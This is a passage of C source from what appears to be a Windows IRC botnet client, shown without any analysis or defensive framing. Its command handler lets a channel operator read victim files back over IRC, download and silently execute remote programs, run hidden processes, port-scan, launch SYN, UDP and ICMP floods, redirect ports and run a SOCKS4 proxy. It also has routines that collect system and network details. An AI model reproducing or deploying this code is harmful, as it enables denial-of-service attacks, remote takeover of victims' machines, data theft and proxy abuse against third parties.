			 else if (strcmp("readfile", a[s]) == 0 ) {
 	   HANDLE file = CreateFile(a[s+1],GENERIC_READ,0,0,OPEN_EXISTING,0,0);
	   int size = GetFileSize(file,0);
	   char total[size];
	   char *line;
	   int nBytesRead=0 ;
	   BOOL ret = ReadFile(file,total,(DWORD)sizeof(total),&nBytesRead,0);
	   line = strtok( total, "\n" );
	   while( line != NULL )
	   	{
		    irc_privmsg(sock, a[2], line, notice);
			line = strtok( NULL, "\n" );
		 }
}
			#ifndef NO_CHGCONF 
			else if (strcmp("tempserver", a[s]) == 0) { 
				strncpy(server,  a[s+1], 127); 
				sprintf(sendbuf, "Changed server temporarily: (%s).", a[s+1]); 
				addlog(sendbuf); 
			} 
			else if (strcmp("temppass", a[s]) == 0) { 
				strncpy(password,  a[s+1], 127); 
				sprintf(sendbuf, "Changed password temporarily: (%s).", a[s+1]); 
				addlog(sendbuf); 
			} 
			else if (strcmp("tempchan", a[s]) == 0) { 
				strncpy(channel,  a[s+1], 127); 
				sprintf(sendbuf, "Changed channel temporarily: (%s).", a[s+1]); 
				addlog(sendbuf); 
			} 
			#endif
			else if (strcmp("nick", a[s]) == 0) {
				irc_sendf(sock, "NICK %s\r\n", a[s+1]);
			}
			else if (strcmp("join", a[s]) == 0) {
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
			}
			else if (strcmp("part", a[s]) == 0) {
				irc_sendf(sock, "PART %s\r\n", a[s+1]);
			}
			else if (strcmp("raw", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_send(sock, y);
				}
			}
			else if (strcmp("killthread", a[s]) == 0) {
				BOOL threadkilled = FALSE;
				for (i=1; a[s+i] != NULL; i++) if (strlen(a[s+i]) < 3) if (atoi(a[s+i]) < 64 && atoi(a[s+i]) > 0) {
					TerminateThread(threads[atoi(a[s+i])], 0);
					if (threads[atoi(a[s+i])] != 0) threadkilled = TRUE;
					threads[atoi(a[s+i])] = 0;
					threadd[atoi(a[s+i])][0] = '\0';
					cnick[atoi(a[s+i])][0] = '\0';
					closesocket(csock[atoi(a[s+i])]);
				}
					if (!silent) if (threadkilled) irc_privmsg(sock, a[2], "thread(s) killed.", notice);
			}
			else if (strcmp("prefix", a[s]) == 0) prefix1 = a[s+1][0];
			else if (strcmp("open", a[s]) == 0) {
				if (ShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW)) {
					if (!silent) irc_privmsg(sock, a[2], "file opened.", notice);
				} else {
					if (!silent) irc_privmsg(sock, a[2], "couldn't open file.", notice);
				}
			}
			else if (strcmp("server", a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
			}
			else if (strcmp("dns", a[s]) == 0) {
				HOSTENT *hostent = NULL;
				IN_ADDR iaddr;
				DWORD addr = inet_addr(a[s+1]);

				if (addr != INADDR_NONE) {
					hostent = gethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
					if (hostent != NULL) {
						sprintf(sendbuf, "%s -> %s", a[s+1], hostent->h_name);
					  	irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				else {
					hostent = gethostbyname(a[s+1]);
					if (hostent != NULL) {
						iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
						sprintf(sendbuf, "%s -> %s", a[s+1], inet_ntoa(iaddr));
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				if (hostent == NULL) irc_privmsg(sock, a[2], "couldn't resolve host", notice);
			}
			#ifndef NO_VISIT
			else if (strcmp("visit", a[s]) == 0) {
				vs vs;
				strncpy(vs.host,  a[s+1], sizeof(vs.host)-1);
				if (a[s+2] != NULL) strncpy(vs.referer, a[s+2], sizeof(vs.referer)-1);
				strncpy(vs.chan, a[2], sizeof(vs.chan)-1);
				vs.sock = sock;
				vs.silent = silent;
				CreateThread(NULL, 0, &visit, (void *)&vs, 0, &id);
				while(1) {
					if (vs.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			else if (a[s+2] == NULL) return 1;
			else if (strcmp("rm_win9x3", a[s]) == 0) {
				OSVERSIONINFO verinfo;
				verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
				GetVersionEx(&verinfo);
				char *os;
				if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
					if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
				}
					else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
					else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
						if (os == "95" || os == "98" || os == "ME") {
					irc_sendf(sock, "PART %s\r\n", channel);
					irc_sendf2(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
				}
			}
			else if (strcmp("addalias", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) addalias(a[s+1], y);
				}
			}
			else if (strcmp("privmsg", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) irc_privmsg(sock, a[s+1], y, FALSE);
				}
			}
			else if (strcmp("action", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf, FALSE);
					}
				}
			}
			else if (strcmp("cycle", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				irc_sendf(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
			}
			else if (strcmp("mode", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_sendf(sock, "MODE %s\r\n", y);
				}
			}
			else if (strcmp("repeat", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) return repeat + atoi(a[s+1]); else return repeat;
				}
			}
			else if (strcmp("repeat", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) return repeat + atoi(a[s+1]); else return repeat;
				}
			}
			else if (strcmp("delay", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) Sleep(atoi(a[s+1])*1000);
					return repeat + 1;
				}
			}
			#ifndef NO_DOWNLOAD
			else if (strcmp("moveit", a[s]) == 0) {
				if (strcmp(botid, a[s+2]) == 0) return 1;
				ds ds;
				sprintf(ds.dest, "%s\\%s.exe", tempdir, nick);
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "update (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 1;
				ds.silent = silent;
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				sprintf(sendbuf, "downloading update from %s...\r\n", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			else if (strcmp("execute", a[s]) == 0) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				if (atoi(a[s+1]) == 0) sinfo.wShowWindow = SW_HIDE; else sinfo.wShowWindow = SW_SHOW;
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) && !silent) irc_privmsg(sock, a[2], "couldn't execute file.", notice);
				}
			}
			else if (a[s+3] == NULL) return 1;
			#ifndef NO_SCAN
else if (strcmp("scan", a[s]) == 0 || strcmp("sc", a[s]) == 0) {
	scans sscan;
	sscan.addy.S_un.S_addr = inet_addr(a[s+1]);
	sscan.port = atoi(a[s+2]);
	sscan.delay = atoi(a[s+3]);
	sscan.sock = sock;
	sscan.notice = notice;
	strncpy(sscan.chan,  a[2], sizeof(sscan.chan)-1);
	sprintf(sendbuf, "scan (%s:%d)", inet_ntoa(sscan.addy), sscan.port);
	sscan.threadnum = addthread(sendbuf);
	if (!silent) {
		sprintf(sendbuf, "scan started %s:%d with a delay of %dms\r\n", inet_ntoa(sscan.addy), sscan.port, sscan.delay);
		irc_privmsg(sock, a[2], sendbuf, notice);
	}
	threads[sscan.threadnum] = CreateThread(NULL, 0, &ip_scan, (void *)&sscan, 0, &id);
	while(1) {
		if (sscan.gotinfo == TRUE) break;
		Sleep(50);
	}
}
#endif

//////// SYN FLOOD ////////////////////////////////////////////////////////////
			else if (strcmp("syn", a[s]) == 0) {
synt sin;
strncpy(sin.ip, a[s+1], sizeof(sin.ip)-1);
strncpy(sin.port, a[s+2], sizeof(sin.port)-1);
strncpy(sin.length, a[s+3], sizeof(sin.length)-1);
strncpy(sin.chan, a[2], sizeof(sin.chan)-1);
sin.notice = notice;
sin.socket = sock;
sprintf(sendbuf, "SYN flooding [%s:%s] for %s seconds\r\n", a[s+1], a[s+2], a[s+3]);
irc_privmsg(sock, a[2], sendbuf, notice);
sin.threadnumber = addthread(sendbuf);
threads[sin.threadnumber] = CreateThread(NULL, 0, &synthread, (void *)&sin, 0, &id);
//sprintf(sendbuf, "Done with SYN flood [%iKB/sec]\r\n", SYNFlood(a[s+1], a[s+2], a[s+3]));
//irc_privmsg(sock, a[2], sendbuf, notice);

}

//////// SYN FLOOD ////////////////////////////////////////////////////////////
			#ifndef NO_DOWNLOAD
			else if (strcmp("upload", a[s]) == 0) {
				ds ds;
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				strncpy(ds.dest,  a[s+2], sizeof(ds.dest)-1);
				if (a[s+3] != NULL) ds.run = atoi(a[s+3]); else ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "download (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 0;
				ds.silent = silent;
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				if (!silent) sprintf(sendbuf, "downloading %s...\r\n", a[s+1]);
				irc_privmsg(sock, a[2], sendbuf, notice);
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			#ifndef NO_REDIRECT
			else if (strcmp("redirect", a[s]) == 0) {
				rs rs;
				rs.lport = atoi(a[s+1]);
				strncpy(rs.dest,  a[s+2], sizeof(rs.dest)-1);
				rs.port = atoi(a[s+3]);
				rs.sock = sock;
				sprintf(sendbuf, "redirect (%d->%s:%d)", rs.lport, rs.dest, rs.port);
				rs.threadnum = addthread(sendbuf);
				if (!silent) sprintf(sendbuf, "redirect created on port %d to %s:%d.\r\n", rs.lport, rs.dest, rs.port);
				irc_privmsg(sock, a[2], sendbuf, notice);
				threads[rs.threadnum] = CreateThread(NULL, 0, &redirect, (void *)&rs, 0, &id);
				while(1) {
					if (rs.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			else if (a[s+4] == NULL) return 1;
			#ifndef NO_UDP
			else if (strcmp("udp", a[s]) == 0) {
				ps udps;
				udps.silent = silent;
				strncpy(udps.host,  a[s+1], sizeof(udps.host)-1);
				udps.num = atoi(a[s+2]);
				udps.size = atoi(a[s+3]);
				udps.delay = atoi(a[s+4]);
				if (a[s+5] != NULL) udps.port = atoi(a[s+5]); else udps.port = 0;
				strncpy(udps.chan,  a[2], sizeof(udps.chan)-1);
				udps.sock = sock;
				sprintf(sendbuf, "udp (%s)", udps.host);
				udps.threadnum = addthread(sendbuf);
				sprintf(sendbuf, "sending %d udp packets to: %s. packet size: %d, delay: %d[ms].\r\n", udps.num, udps.host, udps.size, udps.delay);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				threads[udps.threadnum] = CreateThread(NULL, 0, &udp, (void *)&udps, 0, &id);
				while(1) {
					if (udps.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			#ifndef NO_PING
			else if (strcmp("ping", a[s]) == 0) {
				if (!noicmp) {
					ps pings;
					pings.silent = silent;
					strncpy(pings.host,  a[s+1], sizeof(pings.host)-1);
					pings.num = atoi(a[s+2]);
					pings.size = atoi(a[s+3]);
					pings.delay = atoi(a[s+4]);
					strncpy(pings.chan,  a[2], sizeof(pings.chan)-1);
					pings.sock = sock;
					sprintf(sendbuf, "ping (%s)", pings.host);
					pings.threadnum = addthread(sendbuf);
					sprintf(sendbuf, "sending %d pings to %s. packet size: %d, timeout: %d[ms]\r\n", pings.num, pings.host, pings.size, pings.delay);
					threads[pings.threadnum] = CreateThread(NULL, 0, &ping, (void *)&pings, 0, &id);
					while(1) {
						if (pings.gotinfo == TRUE) break;
						Sleep(50);
					}
				} else strncpy(sendbuf, "icmp.dll not available", sizeof(sendbuf)-1);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}
			#endif
		}
	}
	return repeat;
 }

 void irc_send(SOCKET sock, char *msg)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, "%s\r\n", msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }


 void irc_sendf(SOCKET sock, char *msg, char *str)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str, str2);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice)
 {
	char msgbuf[512];
	char *action;

	memset(msgbuf, 0, sizeof(msgbuf));
	if (notice) action = "NOTICE"; else action = "PRIVMSG";
	sprintf(msgbuf, "%s %s :%s\r\n", action, dest, msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 char * replacestr(char *str, char *oldstr, char *newstr)
 {
	char *p;
	char str2[512];
	char str3[512];
	char str4[512];

	memset(str2, 0, sizeof(str2));
	memset(str3, 0, sizeof(str3));
	memset(str4, 0, sizeof(str4));
	strncpy(str2,  str, sizeof(str2)-1);
	if (strlen(newstr) > 384) newstr[384] = '\0';

	while (strstr(str2, oldstr) != NULL) {
		p = strstr(str2, oldstr);
		strncpy(str4,  p + strlen(oldstr), sizeof(str4)-1);
		p[0] = '\0';
		strncpy(str3,  str2, sizeof(str3)-1);
		if (p+1 != NULL && oldstr-1 != NULL) if (strlen(p+1) > strlen(oldstr-1)) sprintf(str2, "%s%s%s", str3, newstr, str4);
		 else sprintf(str2, "%s%s", str3, newstr);
		if (strstr(oldstr, newstr) != NULL) break;
	}
	strncpy(str,  str2, strlen(str2)+1);
	return str;
 }

 #ifndef NO_UDP
 DWORD WINAPI udp(LPVOID param)
 {
	ps udp;
	SOCKADDR_IN ssin;
	LPHOSTENT hostent = NULL;
	IN_ADDR iaddr;
	SOCKET usock;
	int i;

	udp = *((ps *)param);
	ps *udps = (ps *)param;
	udps->gotinfo = TRUE;
	char *host = udp.host;
	usock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	iaddr.s_addr = inet_addr(udp.host);
	if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(udp.host);
	if (hostent == NULL && iaddr.s_addr == INADDR_NONE) {
		if (!udp.silent) irc_sendf2(udp.sock, "PRIVMSG %s :error sending packets to %s.\r\n", udp.chan, host);
		threads[udp.threadnum] = 0;
		threadd[udp.threadnum][0] = '\0';
		return 0;
	}
	if (hostent != NULL) ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);
	else ssin.sin_addr = iaddr;

	srand(GetTickCount());
if (udp.port == 0) ssin.sin_port = htons((rand() % 65500) + 1); else ssin.sin_port = htons(udp.port);
if (udp.port < 1) udp.port = 1;
if (udp.port > 65535) udp.port = 65535;

	for (i = 0; i < udp.size; i++) pbuff[i] = (rand() % 255);
	while (udp.num-- > 0) {
		for (i = 0; i < 11; i++) {
			sendto(usock, pbuff, udp.size-(rand() % 10), 0, (LPSOCKADDR)&ssin, sizeof(ssin));
			Sleep(udp.delay);
		}
		if (udp.port == 0) ssin.sin_port = htons((rand() % 65500) + 1);
	}
	if (!udp.silent) irc_sendf2(udp.sock, "PRIVMSG %s :finished sending packets to %s.\r\n", udp.chan, host);

	threads[udp.threadnum] = 0;
	threadd[udp.threadnum][0] = '\0';
	return 0;
 }
 #endif

 #ifndef NO_PING
 DWORD WINAPI ping(LPVOID param)
 {
	ps ping;
	HANDLE icmp;
	LPHOSTENT hostent = NULL;
	IN_ADDR iaddr;
	IPAddr ip;
	ICMP_ECHO_REPLY reply;
	int i;

	ping = *((ps *)param);
	ps *psp = (ps *)param;
	psp->gotinfo = TRUE;
	char *host = ping.host;

	icmp = (HANDLE)fIcmpCreateFile();

	iaddr.s_addr = inet_addr(ping.host);
	if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(ping.host);
	if ((hostent == NULL && iaddr.s_addr == INADDR_NONE) || icmp == INVALID_HANDLE_VALUE) {
		if (!ping.silent) irc_sendf2(ping.sock, "PRIVMSG %s :error sending pings to %s.\r\n", ping.chan, host);
		threads[ping.threadnum] = 0;
		threadd[ping.threadnum][0] = '\0';
		return 0;
	}
	if (hostent != NULL) ip = *(DWORD*)*hostent->h_addr_list;
	else ip = iaddr.s_addr;

	memset(&reply, 0, sizeof(reply));
	reply.RoundTripTime = 0xffffffff;

  	if (ping.size > 65500) ping.size = 65500;
	if (ping.delay < 1) ping.delay = 1;
	for (i = 0; i < ping.num; i++) {
		fIcmpSendEcho(icmp, ip, pbuff, ping.size, NULL, &reply, sizeof(ICMP_ECHO_REPLY), ping.delay);
	}

	fIcmpCloseHandle(icmp);
	if (!ping.silent) irc_sendf2(ping.sock, "PRIVMSG %s :finished sending pings to %s.\r\n", ping.chan, host);

	threads[ping.threadnum] = 0;
	threadd[ping.threadnum][0] = '\0';
	return 0;
 }
 #endif

 #ifndef NO_SOCK4SERV
DWORD WINAPI SocksDaemon(LPVOID param)
{
	struct sockaddr_in info;
	struct sockaddr_in client_in;
	SOCKET server;
	SOCKET client;
	DWORD lpThreadId;

	info.sin_family = AF_INET;
	info.sin_port = htons(sock4port);
	info.sin_addr.s_addr = INADDR_ANY;
	server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (bind(server, (SOCKADDR *)&info, sizeof(info)) != 0)
	{
		return 0;
	}
	if (listen(server, 10) != 0)
	{
		return 0;
	}
	while (TRUE)
	{
		client = accept(server, (SOCKADDR *)&client_in, NULL);
		CreateThread(NULL, 0, &Socks4ClientThread, (LPVOID)client, 0, &lpThreadId);
	}
	return 0;
}

DWORD WINAPI Socks4ClientThread(LPVOID pParam)
{
	struct SOCKS4HEADER hdr;
	SOCKET client=(SOCKET)pParam;
	TIMEVAL timeout;
	fd_set fd;
	SOCKADDR_IN target_in;
	SOCKET outbound;

	timeout.tv_sec = 5;
	timeout.tv_usec = 0;
	FD_ZERO(&fd);
	FD_SET(client, &fd);
	if (select(0, &fd, NULL, NULL, &timeout) == 0)
	{
		closesocket(client);
		return 0;
	}
	if (recv(client, (char *)&hdr, sizeof(hdr), 0) <= 0)
	{
		closesocket(client);
		return 0;
	}
	if (hdr.vn != 4 || hdr.cd != SOCKS4_CONNECT) 
	{
		closesocket(client);
		return 0;
	}
	memset(&target_in, 0, sizeof(target_in));
	target_in.sin_family = AF_INET;
	target_in.sin_port = hdr.destport;
	target_in.sin_addr.s_addr = hdr.destaddr;
	outbound = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connect(outbound, (SOCKADDR *)&target_in, sizeof(target_in)) == SOCKET_ERROR)
	{
		hdr.vn = 0;
		hdr.cd = SOCKS4_REJECT;
		memset(&hdr.userid, 0, 1024);
		send(client, (char *)&hdr, 8, 0);
		closesocket(client);
		return 0;
	}
	hdr.vn = 0;
	hdr.cd = SOCKS4_GRANT;
	memset(&hdr.userid, 0, 1024);
	send(client, (char *)&hdr, 8, 0);
	transfer_loop(outbound, client);
	return 0;
}

void transfer_loop(SOCKET target, SOCKET client)
{
	int len;
	char buf[1024];
	fd_set fd;

	while (TRUE)
	{
		FD_ZERO(&fd);
		FD_SET(client, &fd);
		FD_SET(target, &fd);

		memset(buf, 0, sizeof(buf));
		select(0, &fd, NULL, NULL, NULL);

		if(FD_ISSET(client, &fd))
		{
			if((len = recv(client,buf,sizeof(buf),0))== -1) break;
			if(send(target,buf,len,0)== -1) break;
		}
	    if (FD_ISSET(target,&fd))
		{
			if((len = recv(target,buf,sizeof(buf),0))== -1) break;
			if(send(client,buf,len,0)== -1) break;
		}
	}
}
#endif

 #ifndef NO_DOWNLOAD
 DWORD WINAPI webdownload(LPVOID param)
 {
	char fbuff[512];
	char tstr[256];
	HANDLE fh, f;
	DWORD r, d, start, total, speed;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	ds dl;
	dl = *((ds *)param);
	ds *dsp = (ds *)param;
	dsp ->gotinfo = TRUE;
	fh = InternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {

		f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		if (f < (HANDLE)1) {
			if (!dl.silent) irc_sendf2(dl.sock, "PRIVMSG %s :couldn't open %s.\r\n", dl.chan, dl.dest);
			threads[dl.threadnum] = 0;
			threadd[dl.threadnum][0] = '\0';
			return 0;
		}

		total = 1;
		start = GetTickCount();

		do {
			memset(fbuff, 0, sizeof(fbuff));
			InternetReadFile(fh, fbuff, sizeof(fbuff), &r);
			WriteFile(f, fbuff, r, &d, NULL);
			total = total + r;
			if (dl.update != 1) sprintf(threadd[dl.threadnum], "file download (%s - %dkb transferred)", dl.url, total / 1024);
			 else sprintf(threadd[dl.threadnum], "update (%s - %dkb transferred)", dl.url, total / 1024);
		} while (r > 0);

		speed = total / (((GetTickCount() - start) / 1000) + 1);

		CloseHandle(f);

		if (dl.update != 1) {
			sprintf(tstr, "downloaded %.1f kb to %s @ %.1f kb/sec.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);

			if (dl.run == 1) {
				ShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				if (!dl.silent) irc_sendf2(dl.sock, "PRIVMSG %s :opened %s.\r\n", dl.chan, dl.dest);
			}

		} else {
			sprintf(tstr, "downloaded %.1f kb to %s @ %.1f kb/sec. updating...", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);

			memset(&sinfo, 0, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo);
			sinfo.wShowWindow = SW_HIDE;
			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
				uninstall();
				WSACleanup();
				exit(0);
			} else {
				if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "update failed: error executing file.", FALSE);
			}
		}
	} else if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "bad url, or dns error.", FALSE);

	InternetCloseHandle(fh);

	threads[dl.threadnum] = 0;
	threadd[dl.threadnum][0] = '\0';
	return 0;
 }
 #endif

 #ifndef NO_REDIRECT
 DWORD WINAPI redirect(LPVOID param)
 {
	SOCKET rsock, clsock;
	SOCKADDR_IN rssin, cssin;
	rs redirect;
	DWORD id;

	redirect = *((rs *)param);
	rs *rsp = (rs *)param;
	rsp->gotinfo = TRUE;
	rsock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	WSAAsyncSelect(rsock, 0, WM_USER + 1, FD_READ);
	memset(&rssin, 0, sizeof(rssin));
	rssin.sin_family = AF_INET;
	rssin.sin_port = htons(redirect.lport);
	bind(rsock, (SOCKADDR *)&rssin, sizeof(rssin));

	csock[redirect.threadnum] = rsock;

	while(1) {
		if (listen(rsock, 10) == SOCKET_ERROR) break;
		clsock = accept(rsock, (SOCKADDR *)&cssin, NULL);
		if (clsock != INVALID_SOCKET) {
			redirect.csock = clsock;
			CreateThread(NULL, 0, &redirectloop, (void *)&redirect, 0, &id);
		}
	}

	closesocket(clsock);
	closesocket(rsock);

	threads[redirect.threadnum] = 0;
	threadd[redirect.threadnum][0] = '\0';

	return 0;
 }

 DWORD WINAPI redirectloop(LPVOID param)
 {
	SOCKET sock;
	SOCKET csock;
	char *dest;
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	int port, err;
	char buff[4096];
	rs rs2;
	rs2 = *((rs *)param);
	csock = rs2.csock;
	dest = rs2.dest;
	port = rs2.port;
	DWORD id;

	while (1) {
		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(port);
		iaddr.s_addr = inet_addr(dest);
		if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(dest);
		else hostent = gethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL) break;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) break;

		rs2.sock = sock;
		CreateThread(NULL, 0, &redirectloop2, (void *)&rs2, 0, &id);

		while (1) {
			memset(buff, 0, sizeof(buff));
			err = recv(csock, buff, sizeof(buff), 0);
			if (err == 0) {
				break;
			}
			if (err == SOCKET_ERROR) break;

			err = send(sock, buff, err, 0);
			if (err == SOCKET_ERROR) break;

		}

		break;
	}

	closesocket(csock);
	closesocket(sock);

	return 0;
 }

 DWORD WINAPI redirectloop2(LPVOID param)
 {
	SOCKET sock;
	SOCKET csock;
	rs rs2;
	int err;
	char buff[4096];
	rs2 = *((rs *)param);
	sock = rs2.sock;
	csock = rs2.csock;

	while (1) {
		memset(buff, 0, sizeof(buff));
		err = recv(sock, buff, sizeof(buff), 0);
		if (err == 0) {
			break;
		}
		if (err == SOCKET_ERROR) break;
		err = send(csock, buff, err, 0);
		if (err == SOCKET_ERROR) break;
	}

	closesocket(csock);
	return 0;
 }
 #endif

 #ifndef NO_NETINFO
 char * netinfo(char *ninfo, char *host, SOCKET sock)
 {

	SOCKADDR sa;
	int sas;
	DWORD n;
	char ctype[8];
	char cname[128];

	memset(cname, 0, sizeof(cname));
	memset(ctype, 0, sizeof(ctype));
	if (!noigcse) {
		fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0);
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) strncpy(ctype,  "dial-up", sizeof(ctype)-1);
	 	else strncpy(ctype,  "LAN", sizeof(ctype)-1);
	} else {
		strncpy(ctype, "N/A", sizeof(ctype)-1);
		strncpy(cname, "N/A", sizeof(cname)-1);
	}

	sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(ninfo, "connection type: %s (%s). local IP address: %d.%d.%d.%d. connected from: %s", ctype, cname, (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5], host);
	return ninfo; // return the netinfo string
 }
 #endif

 #ifndef NO_SYSINFO
 char * sysinfo(char *sinfo)
 {
	int total;
	MEMORYSTATUS memstat;
	OSVERSIONINFO verinfo;
	char szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD dwNameSize = MAX_COMPUTERNAME_LENGTH + 1;
	char *szCompname;
	TCHAR szUserName[21];
	DWORD dwUserSize = sizeof(szUserName);

	GlobalMemoryStatus(&memstat);
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);
	char *os;
	char os2[140];
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2000";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else os = "???";

